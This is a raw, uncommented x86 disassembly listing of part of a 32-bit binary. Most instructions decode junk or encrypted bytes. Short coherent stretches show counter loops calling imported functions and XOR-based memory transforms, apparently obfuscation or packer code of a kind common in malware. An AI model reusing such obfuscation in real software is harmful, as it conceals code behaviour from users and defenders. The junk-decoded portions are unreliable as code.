  408362:	mov    DWORD PTR ds:0x433773,0x5769
  40836c:	jmp    0x4084f3
  408371:	or     ebx,ecx
  408373:	add    DWORD PTR [ecx+eax*8],ecx
  408376:	aam    0x11
  408378:	retf   
  408379:	imul   esp,edx,0xffffffd8
  40837c:	mov    eax,0xa45d242a
  408381:	push   es
  408382:	aad    0x7e
  408384:	jle    0x40836a
  408386:	jg     0x408406
  408388:	jle    0x408368
  40838a:	push   es
  40838b:	push   0x44
  40838d:	jnp    0x4083a2
  40838f:	cmp    BYTE PTR ds:0x8193fe82,dl
  408395:	je     0x40831d
  408397:	dec    ecx
  408398:	std    
  408399:	cmp    ecx,esp
  40839b:	out    dx,eax
  40839c:	pop    ebp
  40839d:	fld    DWORD PTR [ebx-0x191c3ccb]
  4083a3:	dec    eax
  4083a4:	jb     0x4083ae
  4083a6:	(bad)  
  4083a7:	sbb    esp,edx
  4083a9:	je     0x4083e3
  4083ab:	cmp    al,0xa7
  4083ad:	jle    0x4083a9
  4083af:	bound  ebx,QWORD PTR ds:0xa7f3d0f3
  4083b5:	jne    0x408399
  4083b7:	stos   BYTE PTR es:[edi],al
  4083b8:	jmp    0xf57cd8b2
  4083bd:	push   edx
  4083be:	dec    esp
  4083bf:	adc    al,0xeb
  4083c1:	jnp    0x408389
  4083c3:	in     al,0xdf
  4083c5:	mov    al,BYTE PTR [eax+0x391fc8ee]
  4083cb:	add    DWORD PTR [esi+eiz*4-0x6e],ebp
  4083cf:	jnp    0x4083bd
  4083d1:	inc    eax
  4083d2:	stc    
  4083d3:	or     DWORD PTR [ebx],edx
  4083d5:	fnstsw WORD PTR [ebx+ebx*1]
  4083d8:	(bad)  [edx]
  4083da:	aad    0x62
  4083dc:	dec    ebp
  4083dd:	sbb    al,0xc1
  4083df:	add    BYTE PTR [ecx+0x53],al
  4083e2:	arpl   WORD PTR ds:0x89653c40,bx
  4083e8:	mov    DWORD PTR [edi+0x7c],ecx
  4083eb:	mov    bh,0x5d
  4083ed:	rcr    BYTE PTR [eax+0x739f61ec],1
  4083f3:	repnz xor dh,BYTE PTR [ecx+0x52225380]
  4083fa:	imul   eax,DWORD PTR [edi-0x4021bf2d],0x9
  408401:	fucom  st(5)
  408403:	push   ss
  408404:	sub    eax,0x6270074b
  408409:	sahf   
  40840a:	mov    dl,0xb6
  40840c:	enter  0xa75f,0xa8
  408410:	sbb    DWORD PTR [ecx+0x42],0x67
  408414:	sub    ebx,DWORD PTR [eax]
  408416:	pop    ebp
  408417:	jae    0x408483
  408419:	pop    esi
  40841a:	hlt    
  40841b:	pop    eax
  40841c:	retf   0x72c6
  40841f:	cs pop eax
  408421:	pop    ss
  408422:	pop    es
  408423:	pop    es
  408424:	in     eax,dx
  408425:	cmp    eax,0xa4f5fee2
  40842a:	jp     0x4083ca
  40842c:	hlt    
  40842d:	push   0x60a4b6a5
  408432:	xchg   esi,eax
  408433:	xchg   ebx,eax
  408434:	pop    eax
  408435:	mov    ds:0xadd5b146,al
  40843a:	push   cs
  40843b:	lds    edx,FWORD PTR [eax+0x33]
  40843e:	lea    esp,[esi+edi*8-0x74]
  408442:	xchg   ecx,eax
  408443:	ret    
  408444:	fidiv  WORD PTR [edx-0x75649c5f]
  40844a:	sbb    BYTE PTR [eax+ebx*4-0x5df7242f],bl
  408451:	mov    al,ds:0x1a479849
  408456:	cmp    BYTE PTR [edx+0x1900fc13],bl
  40845c:	and    al,0x41
  40845e:	retf   0xd438
  408461:	lock cmp ah,BYTE PTR [ecx+0x1344629c]
  408468:	push   ss
  408469:	std    
  40846a:	mov    ch,BYTE PTR [ebx]
  40846c:	hlt    
  40846d:	jp     0x408487
  40846f:	fstp   DWORD PTR [edx+0xf4d8d05]
  408475:	xor    al,0x9
  408477:	jae    0x4084d5
  408479:	outs   dx,DWORD PTR ds:[esi]
  40847a:	lock stos DWORD PTR es:[edi],eax
  40847c:	stos   BYTE PTR es:[edi],al
  40847d:	leave  
  40847e:	cmp    BYTE PTR [ecx],dl
  408480:	xchg   BYTE PTR [ecx+0x3a],ah
  408483:	dec    eax
  408484:	and    DWORD PTR [ecx],esp
  408486:	imul   ebp,ebp,0x36
  408489:	call   0x26ae:0x35531fde
  408490:	adc    DWORD PTR [esi],esi
  408492:	add    al,0x66
  408494:	mov    WORD PTR [esi],cs
  408496:	inc    edi
  408497:	push   ds
  408498:	retf   
  408499:	dec    edi
  40849a:	inc    ecx
  40849b:	ror    DWORD PTR [edi],1
  40849d:	dec    edx
  40849e:	neg    DWORD PTR [esi+eax*4]
  4084a1:	mov    ebp,0x493a79b5
  4084a6:	jns    0x408481
  4084a8:	in     al,dx
  4084a9:	mov    al,ds:0x54a74d34
  4084ae:	ins    DWORD PTR es:[edi],dx
  4084af:	lahf   
  4084b0:	retf   0xeefe
  4084b3:	mov    dh,0x3f
  4084b5:	and    DWORD PTR [edi+0x6abac183],eax
  4084bb:	or     al,bl
  4084bd:	cmp    BYTE PTR [esp+esi*8-0x71338dda],0x6c
  4084c5:	jo     0x408454
  4084c7:	push   esp
  4084c8:	(bad)  
  4084c9:	in     al,0x9
  4084cb:	inc    ebx
  4084cc:	scas   eax,DWORD PTR es:[edi]
  4084cd:	lea    eax,[ebx-0x36]
  4084d0:	lea    esp,[esi-0x36]
  4084d3:	imul   eax,DWORD PTR [ebx],0xffffffe0
  4084d6:	pushf  
  4084d7:	lock sbb DWORD PTR [edx-0x35],edi
  4084db:	lahf   
  4084dc:	dec    edi
  4084dd:	(bad)  
  4084de:	mov    DWORD PTR ss:[edi],0xe0db7213
  4084e5:	sahf   
  4084e6:	and    edi,DWORD PTR [edx+0x53c80afc]
  4084ec:	sbb    esi,eax
  4084ee:	xchg   esi,eax
  4084ef:	mov    ds:0xf1cb2fd,al
  4084f4:	test   BYTE PTR [esi+0x9],cl
  4084f7:	add    BYTE PTR [eax],al
  4084f9:	neg    edx
  4084fb:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  408502:	lea    eax,[ebp-0xc]
  408505:	and    DWORD PTR ds:0x43382f,0x0
  40850f:	jmp    0x408521
  408514:	mov    edx,DWORD PTR ds:0x43382f
  40851a:	inc    edx
  40851b:	mov    DWORD PTR ds:0x43382f,edx
  408521:	cmp    DWORD PTR ds:0x43382f,0x13
  408528:	jae    0x40854b
  40852e:	cmp    DWORD PTR ds:0x43382f,0x17
  408535:	jne    0x408546
  40853b:	push   0x433867
  408540:	call   DWORD PTR ds:0x4121cc
  408546:	jmp    0x408514
  40854b:	mov    DWORD PTR [ebp-0x10],eax
  40854e:	and    eax,0x759a
  408553:	mov    eax,DWORD PTR [ebp-0x10]
  408556:	inc    edx
  408557:	mov    edx,DWORD PTR [eax]
  408559:	imul   edx,edx,0xf89ea9ee
  40855f:	mov    DWORD PTR [eax],edx
  408561:	mov    eax,DWORD PTR [ebp-0xc]
  408564:	mov    DWORD PTR ds:0x433717,0x1de7
  40856e:	cmp    eax,0x823721f2
  408573:	je     0x4088e8
  408579:	sub    edi,ebx
  40857b:	mov    eax,DWORD PTR [ebp-0x1c]
  40857e:	sbb    edi,DWORD PTR ds:0x433773
  408584:	or     DWORD PTR [eax],0x60751c9e
  40858a:	and    DWORD PTR ds:0x4337bf,0x0
  408594:	mov    ebx,DWORD PTR ds:0x4337bf
  40859a:	inc    ebx
  40859b:	mov    DWORD PTR ds:0x4337bf,ebx
  4085a1:	cmp    DWORD PTR ds:0x4337bf,0x1f
  4085a8:	jne    0x4085bf
  4085ae:	push   DWORD PTR [ebp-0x1c]
  4085b1:	push   0x4378
  4085b6:	push   DWORD PTR [ebp-0xc]
  4085b9:	call   DWORD PTR ds:0x412010
  4085bf:	cmp    DWORD PTR ds:0x4337bf,0x19
  4085c6:	jb     0x408594
  4085cc:	jmp    0x408753
  4085d1:	xor    BYTE PTR [esi+0x61516153],dh
  4085d7:	xor    BYTE PTR [edi+0x20],dh
  4085da:	outs   dx,BYTE PTR ds:[esi]
  4085db:	fucomi st,st(1)
  4085dd:	xlat   BYTE PTR ds:[ebx]
  4085de:	mov    esi,0xd2ec702d
  4085e3:	jle    0x408663
  4085e5:	in     al,0x7f
  4085e7:	jle    0x408667
  4085e9:	shl    DWORD PTR [eax+0x1512e181],0xac
  4085f0:	mov    eax,ds:0xb4c6f8ea
  4085f5:	cmp    ecx,DWORD PTR [edi+eiz*4-0x448c1adf]
  4085fc:	sub    eax,0x660d3fc1
  408602:	jmp    0x408667
  408604:	mov    dl,0xd8
  408606:	mov    ebx,0x3a730f46
  40860b:	mov    dl,0x65
  40860d:	dec    esp
  40860e:	test   ecx,edx
  408610:	xchg   esi,eax
  408611:	adc    bl,BYTE PTR [eax]
  408613:	out    dx,eax
  408614:	cdq    
  408615:	pop    DWORD PTR [edx+0x67]
  408618:	ret    
  408619:	inc    edx
  40861b:	repz shr DWORD PTR [edx-0x72e0412c],cl
  408622:	xor    ch,BYTE PTR [ebx-0x29]
  408625:	ins    DWORD PTR es:[edi],dx
  408626:	push   0x46
  408628:	sbb    cl,BYTE PTR [eax+edi*1]
  40862b:	mov    esi,0xf2191f07
  408630:	inc    eax
  408631:	adc    bl,BYTE PTR [eax]
  408633:	jp     0x408606
  408635:	std    
  408636:	cwde   
  408637:	mov    ch,0x28
  408639:	cld    
  40863a:	je     0x4085df
  40863c:	in     al,dx
  40863d:	mov    dl,0xde
  40863f:	jle    0x40862e
  408641:	add    esi,DWORD PTR [edx-0x45eb6a14]
  408647:	jp     0x4086ba
  408649:	jecxz  0x4086aa
  40864b:	sti    
  40864c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40864d:	(bad)  
  40864e:	stc    
  40864f:	pushf  
  408650:	xchg   DWORD PTR [edi-0x46140c79],esp
  408656:	(bad)  
  408658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408659:	mov    si,WORD PTR [ebx+0x3f119bb1]
  408660:	jo     0x408610
  408662:	call   0x5d9b:0x6a0cbfcf
  408669:	mov    esp,0xc33d3e07
  40866e:	(bad)  
  40866f:	shl    BYTE PTR [eax-0x789db82c],1
  408675:	sahf   
  408676:	loopne 0x4086bd
  408678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408679:	adc    al,0xf4
  40867b:	pop    ss
  40867c:	mov    al,0x6b
  40867e:	cmc    
  40867f:	call   DWORD PTR [edi+0x30]
  408682:	xlat   BYTE PTR ds:[ebx]
  408683:	xchg   esp,eax
  408684:	mov    dh,0x12
  408686:	jne    0x408652
  408688:	cmc    
  408689:	mov    ebx,DWORD PTR [eax]
  40868b:	mov    ebx,0x4bc307af
  408690:	aas    
  408691:	aam    0x5e
  408693:	xor    DWORD PTR [esi-0x17],esp
  408696:	or     DWORD PTR [edx],ebx
  408698:	xchg   edi,eax
  408699:	or     ebp,ebp
  40869b:	push   ds
  40869c:	or     DWORD PTR [eax-0x61eefe31],ebp
  4086a2:	outs   dx,DWORD PTR ds:[esi]
  4086a3:	jnp    0x408658
  4086a5:	sar    DWORD PTR [edi],0x94
  4086a8:	mov    ecx,DWORD PTR ds:0x99732ff
  4086ae:	outs   dx,BYTE PTR ds:[esi]
  4086af:	adc    al,0x10
  4086b1:	xchg   ebx,eax
  4086b2:	retf   
  4086b3:	xor    al,0x3
  4086b5:	xor    cl,BYTE PTR [edx-0xb]
  4086b8:	sub    ch,ch
  4086ba:	sbb    eax,0x43e1905c
  4086bf:	les    esp,FWORD PTR [eax]
  4086c1:	jg     0x408654
  4086c3:	sbb    eax,0x8d39dd22
  4086c8:	cmp    BYTE PTR [ebx],dl
  4086ca:	into   
  4086cb:	nop
  4086cc:	(bad)  
  4086cd:	and    BYTE PTR [edx],dl
  4086cf:	fs lahf 
  4086d1:	push   esi
  4086d2:	cmp    ah,BYTE PTR [edi]
  4086d4:	jmp    0x40871f
  4086d6:	outs   dx,BYTE PTR ds:[esi]
  4086d7:	out    dx,al
  4086d8:	test   BYTE PTR [edi],bl
  4086da:	fsubr  DWORD PTR [eax+esi*8+0x61]
  4086de:	mov    eax,DWORD PTR [esi-0x4919db70]
  4086e4:	dec    esp
  4086e5:	add    edx,DWORD PTR [edi+0x14]
  4086e8:	nop
  4086e9:	test   BYTE PTR [eax+0x3a],dh
  4086ec:	xor    DWORD PTR [edi-0x2d3cde46],0x1c
  4086f3:	sbb    bl,ah
  4086f5:	mov    eax,ds:0xb4c80876
  4086fa:	js     0x408767
  4086fc:	jmp    0x9132eec8
  408701:	clc    
  408702:	ins    BYTE PTR es:[edi],dx
  408703:	mov    ds:0x12966664,al
  408708:	mov    cl,0xec
  40870a:	and    DWORD PTR [ebp-0x38ae303c],edi
  408710:	jmp    0x408728
  408712:	or     eax,0x19f83ffe
  408717:	xchg   edi,eax
  408718:	pop    ds
  408719:	scas   eax,DWORD PTR es:[edi]
  40871a:	sbb    al,0x3e
  40871c:	adc    BYTE PTR [eax+edx*8],dl
  40871f:	popf   
  408720:	xor    al,0x68
  408722:	lds    ebp,FWORD PTR [eax-0x78]
  408725:	out    dx,eax
  408726:	je     0x4086b0
  408728:	mov    al,0x62
  40872a:	cmp    BYTE PTR [edi+eiz*1-0x3b],cl
  40872e:	add    eax,0x23601464
  408733:	sahf   
  408734:	xor    eax,0xdc597e87
  408739:	push   ds
  40873a:	add    bl,BYTE PTR [edx+0x3c]
  40873d:	cdq    
  40873e:	mov    al,ds:0xa0acf0a5
  408743:	in     al,0x9
  408745:	fnsave [edi-0xc]
  408748:	mov    dh,0x40
  40874a:	adc    eax,0x6edb8d29
  40874f:	int    0x4f
  408751:	repz ret 0x458b
  408755:	clc    
  408756:	xor    eax,ecx
  408758:	add    eax,esi
  40875a:	jmp    0x4088e1
  40875f:	(bad)  
  408761:	adc    DWORD PTR [ebp+0x71684531],eax
  408767:	test   BYTE PTR [esi+0x41],cl
  40876a:	or     bl,bh
  40876c:	or     edi,DWORD PTR [ecx]
  40876e:	push   dx
  408770:	sar    DWORD PTR [esi+0x7e],cl
  408773:	in     al,0x7f
  408775:	jle    0x4087f5
  408777:	xchg   edi,eax
  408778:	mov    esp,0x914812b6
  40877d:	xchg   ecx,eax
  40877e:	outs   dx,DWORD PTR ds:[esi]
  40877f:	dec    ecx
  408780:	add    al,0xa2
  408782:	sbb    ebp,ebp
  408784:	sahf   
  408785:	inc    ecx
  408786:	pop    edi
  408787:	push   esp
  408788:	xor    al,0x17
  40878a:	sub    esp,0x26b43c53
  408790:	inc    eax
  408791:	std    
  408792:	(bad)  
  408793:	add    eax,0x8e2d5044
  408798:	push   eax
  408799:	out    dx,eax
  40879a:	mov    esp,edx
  40879c:	cwde   
  40879d:	sub    BYTE PTR [eax],ch
  40879f:	scas   al,BYTE PTR es:[edi]
  4087a0:	shr    DWORD PTR [ebp+0x7f],1
  4087a3:	jno    0x4087e7
  4087a5:	jns    0x4087ab
  4087a7:	push   esp
  4087a8:	mov    ch,0x96
  4087aa:	fsub   st,st(6)
  4087ac:	xchg   DWORD PTR [ebx+0x5b],edx
  4087af:	push   DWORD PTR [eax-0x6d327147]
  4087b5:	aas    
  4087b6:	pop    edx
  4087b7:	and    bl,BYTE PTR [ebp*4-0x26692e9e]
  4087be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087bf:	jmp    0x7c4e1b51
  4087c4:	pop    ebx
  4087c5:	or     al,0xdd
  4087c8:	mov    edx,0xa42f045a
  4087cd:	in     al,0x9
  4087cf:	xor    BYTE PTR [esi-0x19],bh
  4087d2:	ja     0x40877e
  4087d4:	sbb    bh,bl
  4087d6:	das    
  4087d7:	test   DWORD PTR [ecx+eiz*8+0x24],ebx
  4087db:	fcmovnbe st,st(4)
  4087dd:	mov    BYTE PTR [ebp+0x361ff6bf],dl
  4087e3:	inc    ebp
  4087e4:	jmp    0x408802
  4087e6:	jbe    0x40883f
  4087e8:	cld    
  4087e9:	lods   eax,DWORD PTR ds:[esi]
  4087ea:	in     al,dx
  4087eb:	cs jae 0x4087f9
  4087ee:	loopne 0x4087e6
  4087f0:	(bad)  
  4087f1:	icebp  
  4087f2:	pop    es
  4087f3:	outs   dx,BYTE PTR ds:[esi]
  4087f4:	and    WORD PTR [eax],di
  4087f7:	sbb    ah,BYTE PTR [edx+0x4770b4c1]
  4087fd:	nop
  4087fe:	enter  0xc38e,0xe
  408802:	or     al,0xe8
  408804:	lds    ebx,FWORD PTR [ebp-0xc4b708b]
  40880a:	sbb    DWORD PTR [esi],edi
  40880c:	mov    dl,bh
  40880e:	stos   DWORD PTR es:[edi],eax
  40880f:	and    al,0x57
  408811:	inc    eax
  408812:	in     eax,dx
  408813:	mov    eax,0xdab6886d
  408818:	(bad)  
  40881a:	xor    dl,BYTE PTR [ebx-0x7d7ebd06]
  408820:	sbb    eax,0x1d11ff14
  408825:	fsubr  st(7),st
  408827:	int    0xfa
  408829:	inc    esp
  40882a:	mov    cl,0xf6
  40882c:	push   ecx
  40882d:	mov    ax,0x1737
  408831:	sub    ecx,eax
  408833:	retf   0x4aa7
  408836:	pop    es
  408837:	jns    0x408895
  408839:	adc    BYTE PTR [edx],dh
  40883b:	inc    ebx
  40883c:	fsubr  st,st(6)
  40883e:	retf   0xd395
  408841:	push   ss
  408842:	xor    DWORD PTR [esi],0xffffffcc
  408845:	pusha  
  408846:	dec    edx
  408847:	test   BYTE PTR [edx*4-0x606dfb77],ch
  40884e:	fimul  DWORD PTR [edx]
  408850:	sub    al,0x96
  408852:	mov    ds:0x9b2dc9db,al
  408857:	dec    eax
  408858:	adc    al,0xa7
  40885a:	test   BYTE PTR [edx+0x57],cl
  40885d:	idiv   ecx
  40885f:	stos   BYTE PTR es:[edi],al
  408860:	dec    ebx
  408861:	cld    
  408862:	xor    al,BYTE PTR [esi]
  408864:	ins    DWORD PTR es:[edi],dx
  408865:	stos   BYTE PTR es:[edi],al
  408866:	mov    DWORD PTR [esi-0x4],0xffa13127
  40886d:	mov    eax,ds:0x37bc48ac
  408872:	or     ebx,edx
  408874:	not    edx
  408876:	ss ss loop 0x408820
  40887a:	ret    0xc0a0
  40887d:	mov    ah,0xac
  40887f:	ins    BYTE PTR es:[edi],dx
  408880:	cmp    al,0x5d
  408882:	xchg   ebx,eax
  408883:	ror    DWORD PTR gs:[esi-0xd],1
  408887:	push   cs
  408888:	ja     0x4088ae
  40888a:	push   cs
  40888b:	mov    edi,esp
  40888d:	jge    0x4088c5
  40888f:	add    BYTE PTR [ebx+0x7b],bl
  408892:	adc    BYTE PTR [eax+edx*2],dl
  408895:	rcl    DWORD PTR [esi-0x4],cl
  408898:	sbb    ebx,DWORD PTR [eax-0x26184493]
  40889e:	pop    es
  40889f:	(bad)  
  4088a0:	push   ds
  4088a1:	xchg   BYTE PTR ds:0x71ceec05,cl
  4088a7:	inc    ebx
  4088a8:	mov    dh,0xe1
  4088aa:	mov    ebx,0x8e1d30c5
  4088af:	add    al,0xba
  4088b1:	and    al,0x95
  4088b3:	mov    edi,0xabd77344
  4088b8:	push   ds
  4088b9:	cld    
  4088ba:	sub    dl,BYTE PTR [esi]
  4088bc:	mov    al,0x92
  4088be:	mov    BYTE PTR [esi+0x58a3e29d],cl
  4088c4:	pop    edx
  4088c5:	sbb    al,0x8c
  4088c7:	loopne 0x408938
  4088c9:	inc    ebp
  4088ca:	pop    esp
  4088cb:	mov    ds:0x79e1e59,al
  4088d0:	inc    ecx
  4088d1:	pop    edx
  4088d2:	stos   BYTE PTR es:[edi],al
  4088d3:	dec    esp
  4088d4:	stos   DWORD PTR es:[edi],eax
  4088d5:	enter  0x1f77,0x90
  4088d9:	dec    esp
  4088da:	dec    esi
  4088db:	sub    bh,cl
  4088dd:	dec    edi
  4088de:	push   esi
  4088df:	cld    
  4088e0:	jne    0x408941
  4088e2:	pop    esi
  4088e3:	pop    ebx
  4088e4:	leave  
  4088e5:	ret    0x4
  4088e8:	mov    eax,DWORD PTR [ebp-0xc]
  4088eb:	add    eax,DWORD PTR [ebp-0x18]
  4088ee:	cmp    eax,0x7ad64f9b
  4088f3:	je     0x408907
  4088f9:	mov    eax,DWORD PTR [ebp-0x10]
  4088fc:	and    DWORD PTR [eax],0x751c99
  408902:	jmp    0x40858a
  408907:	mov    eax,DWORD PTR [ebp-0xc]
  40890a:	mov    edx,DWORD PTR [ebp-0x18]
  40890d:	or     eax,edx
  40890f:	cmp    eax,0xfabf2dfb
  408914:	je     0x408928
  40891a:	mov    eax,DWORD PTR [ebp-0x10]
  40891d:	xor    DWORD PTR [eax],0x2650fa8f
  408923:	jmp    0x40858a
  408928:	mov    ax,WORD PTR [ebp-0x4]
  40892c:	jmp    0x408ab3
  408931:	test   eax,0x53c2d3f0
  408936:	loope  0x4088e1
  408938:	jno    0x40892b
  40893a:	jmp    0xdf4a681a
  40893f:	add    al,0xfc
  408941:	cmp    cl,dl
  408943:	jle    0x4089c3
  408945:	in     al,0x7f
  408947:	jle    0x4089c7
  408949:	mov    bh,0x4b
  40894b:	test   al,0xc5
  40894d:	(bad)  
  40894e:	jns    0x4089a9
  408950:	(bad)  
  408952:	jecxz  0x4089a0
  408954:	scas   al,BYTE PTR es:[edi]
  408955:	in     al,dx
  408956:	push   ds
  408957:	ins    BYTE PTR es:[edi],dx
  408958:	mov    esi,0x8f58fceb
  40895d:	imul   eax,esi,0xffffff98
  408960:	pop    eax
  408961:	shl    BYTE PTR [esi-0x63],1
  408964:	xchg   esi,eax
  408965:	mov    al,ds:0x7f609153
  40896a:	add    dl,BYTE PTR [edx]
  40896c:	xchg   edi,eax
  40896d:	push   0x4c
  40896f:	stc    
  408970:	adc    eax,0x1add424
  408975:	arpl   WORD PTR [ecx],ax
  408977:	mov    esp,DWORD PTR [ecx+eiz*2-0x34c00be9]
  40897e:	inc    ah
  408980:	cmp    al,0xc1
  408982:	ficom  WORD PTR [ecx]
  408984:	xchg   edi,eax
  408985:	repz fwait
  408987:	outs   dx,DWORD PTR ds:[esi]
  408988:	test   al,0x66
  40898a:	int    0x30
  40898c:	aas    
  40898d:	aam    0x5e
  40898f:	pop    esp
  408990:	mov    edi,0x57e00d9b
  408995:	mov    esp,0x2113646b
  40899a:	mov    ds:0xe6f0ea92,eax
  40899f:	and    eax,0x96b41818
  4089a4:	mov    ch,0x71
  4089a6:	retf   0xdd53
  4089a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089aa:	test   al,0xcb
  4089ac:	push   edx
  4089ad:	mov    bh,0x98
  4089af:	cs pop ecx
  4089b1:	inc    eax
  4089b2:	(bad)  
  4089b3:	pop    eax
  4089b4:	dec    edi
  4089b5:	test   eax,0xff59f4c3
  4089ba:	pushf  
  4089bb:	(bad)  
  4089bc:	clc    
  4089bd:	mov    ds:0x7e314f25,al
  4089c2:	call   0xa2c53044
  4089c7:	xchg   esp,eax
  4089c8:	mov    ebx,0xafcb985f
  4089cd:	fisub  DWORD PTR [esp+esi*4+0x7a279483]
  4089d4:	in     al,0xf
  4089d6:	mov    ah,0xb4
  4089d8:	xor    al,BYTE PTR ds:[esi-0x159ea148]
  4089df:	mov    esp,0xe71835eb
  4089e4:	dec    esi
  4089e5:	add    eax,DWORD PTR [edx+0xf]
  4089e8:	call   0x10c3426
  4089ed:	lods   eax,DWORD PTR ds:[esi]
  4089ee:	sub    ch,bl
  4089f0:	mov    ch,0xd1
  4089f2:	js     0x4089b0
  4089f4:	mov    eax,ds:0x45c94a1e
  4089f9:	pop    es
  4089fa:	jo     0x4089fc
  4089fc:	fild   DWORD PTR ds:0x4a00bd94
  408a02:	jo     0x408a7d
  408a04:	add    bl,BYTE PTR [esi+0x72]
  408a07:	adc    BYTE PTR [esi],dl
  408a09:	adc    cl,cl
  408a0b:	cmc    
  408a0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a0d:	jl     0x408a53
  408a0f:	mov    ch,0xcc
  408a11:	sbb    dh,cl
  408a13:	int    0xb0
  408a15:	icebp  
  408a16:	test   dh,dh
  408a18:	pop    es
  408a19:	jbe    0x4089e0
  408a1b:	into   
  408a1c:	loope  0x4089f9
  408a1e:	idiv   BYTE PTR [ecx+0x340901c1]
  408a24:	mov    ebp,0x1d8c1e0d
  408a29:	mov    edi,DWORD PTR [edx]
  408a2b:	jb     0x4089e3
  408a2d:	enter  0xae81,0x1b
  408a31:	je     0x408a2f
  408a33:	dec    esi
  408a34:	or     cl,BYTE PTR ds:0xd420579b
  408a3a:	mov    bh,0x57
  408a3c:	fimul  WORD PTR [eax]
  408a3e:	loopne 0x4089d2
  408a40:	pop    edx
  408a41:	scas   al,BYTE PTR es:[edi]
  408a42:	sbb    al,0x3
  408a44:	les    eax,FWORD PTR [ebx+eax*1+0x5b]
  408a48:	sub    al,0x94
  408a4a:	jns    0x408a58
  408a4c:	fbld   TBYTE PTR [edx+0x75]
  408a4f:	mov    edi,0xfc09642d
  408a54:	mov    al,ds:0xd178b630
  408a59:	imul   esi,DWORD PTR [eax-0x2bb69f5e],0x8a171114
  408a63:	push   eax
  408a64:	push   0x5554a9c1
  408a69:	das    
  408a6a:	mov    edx,0xe06b5214
  408a6f:	cmp    BYTE PTR [eax-0x2],0xdc
  408a73:	push   es
  408a74:	xlat   BYTE PTR ds:[ebx]
  408a75:	shl    BYTE PTR [ebx*4-0x109d4eda],1
  408a7c:	adc    DWORD PTR [eax+ecx*1],esi
  408a7f:	int3   
  408a80:	sub    al,0x5b
  408a82:	ins    DWORD PTR es:[edi],dx
  408a83:	call   0x8ba708a1
  408a88:	sar    BYTE PTR [ecx-0x6b653553],0xab
  408a8f:	mov    eax,0x799f55f7
  408a94:	icebp  
  408a95:	or     al,BYTE PTR [eax+0x56]
  408a98:	xchg   ebx,eax
  408a99:	sub    edi,ebx
  408a9b:	shr    DWORD PTR [edi-0x166f31be],1
  408aa1:	stc    
  408aa2:	sbb    ecx,DWORD PTR [ebp-0x2dfebff8]
  408aa8:	xchg   ecx,eax
  408aa9:	cmp    DWORD PTR [ecx],ebx
  408aab:	cmp    DWORD PTR [edi+edi*4-0x7e436b36],esi
  408ab2:	sbb    cl,BYTE PTR [ebx+0x3f8b087d]
  408ab8:	mov    edx,0x8a3c
  408abd:	xor    ax,dx
  408ac0:	mov    edx,0x3b02
  408ac5:	add    ax,dx
  408ac8:	cmp    ax,WORD PTR [edi]
  408acb:	je     0x408c9f
  408ad1:	mov    eax,DWORD PTR [ebp-0x14]
  408ad4:	xor    eax,ecx
  408ad6:	add    eax,esi
  408ad8:	mov    DWORD PTR [ebp-0x24],eax
  408adb:	mov    eax,DWORD PTR [ebp-0x28]
  408ade:	mov    di,WORD PTR [ebp-0x2c]
  408ae2:	mov    ebx,0x8a3c
  408ae7:	xor    di,bx
  408aea:	add    di,dx
  408aed:	movzx  edx,di
  408af0:	mov    edi,DWORD PTR [ebp-0x8]
  408af3:	xor    edi,ecx
  408af5:	lea    edx,[edx+edi*1+0x32729b]
  408afc:	add    DWORD PTR [eax],edx
  408afe:	mov    eax,DWORD PTR [ebp-0x20]
  408b01:	mov    edx,DWORD PTR [ebp-0x8]
  408b04:	mov    edi,DWORD PTR [ebp-0x24]
  408b07:	xor    edx,ecx
  408b09:	jmp    0x408c90
  408b0e:	push   esi
  408b0f:	adc    BYTE PTR [ebx+0x50555155],0x81
  408b16:	sub    esi,edi
  408b18:	jmp    0x408b0d
  408b1a:	pop    esi
  408b1b:	sbb    edi,DWORD PTR [eax-0x4f]
  408b1e:	scas   al,BYTE PTR es:[edi]
  408b1f:	fidivr WORD PTR [esi+0x7e]
  408b22:	in     al,0x7f
  408b24:	jle    0x408ba4
  408b26:	add    al,0x29
  408b28:	dec    esp
  408b29:	add    eax,ebp
  408b2b:	mov    al,0x73
  408b2d:	call   0x452fa898
  408b32:	mov    dh,0x33
  408b34:	ins    BYTE PTR es:[edi],dx
  408b35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b36:	into   
  408b37:	rcl    DWORD PTR [edx+eiz*4+0x5a],cl
  408b3b:	icebp  
  408b3c:	mov    edi,0xd31b3d58
  408b41:	inc    ebp
  408b42:	fcom   QWORD PTR [edi]
  408b44:	fist   WORD PTR [edx-0x66]
  408b47:	jge    0x408b0f
  408b49:	or     ebp,DWORD PTR [eax]
  408b4b:	pop    es
  408b4c:	fwait
  408b4d:	repz out 0xb5,al
  408b50:	jg     0x408b25
  408b52:	or     esi,0x94a0f7
  408b58:	test   al,0x2d
  408b5a:	jb     0x408b05
  408b5c:	jle    0x408b60
  408b5e:	jo     0x408b05
  408b60:	dec    esi
  408b61:	(bad)  
  408b62:	pop    esi
  408b63:	push   0xffffff88
  408b65:	cmp    BYTE PTR [ecx-0x79],bh
  408b68:	push   eax
  408b69:	inc    esp
  408b6a:	fwait
  408b6b:	loopne 0x408ba2
  408b6d:	daa    
  408b6e:	ss aad 0x46
  408b71:	add    ebp,edx
  408b73:	mov    edx,0xb07f3069
  408b78:	cmp    al,0x21
  408b7a:	sbb    al,0x17
  408b7c:	mov    DWORD PTR [esp+edi*4],ebx
  408b7f:	std    
  408b80:	hlt    
  408b81:	pop    esp
  408b82:	frstor ds:0x8942b34f
  408b88:	scas   eax,DWORD PTR es:[edi]
  408b89:	push   ds
  408b8a:	mov    bh,0x51
  408b8c:	retf   
  408b8d:	mov    al,0xec
  408b8f:	mov    ?,WORD PTR [ebx-0xbdca3d4]
  408b95:	mov    edi,0xda6951b4
  408b9a:	mov    ah,0x1
  408b9c:	push   ds
  408b9d:	je     0x408bda
  408b9f:	push   eax
  408ba0:	std    
  408ba1:	and    edi,DWORD PTR [edi+edx*2+0xd]
  408ba5:	lahf   
  408ba6:	imul   ebp,DWORD PTR es:[eax],0x92bc0c44
  408bad:	mov    esi,0x74d333c9
  408bb2:	clc    
  408bb3:	lods   eax,DWORD PTR ds:[esi]
  408bb4:	inc    ebp
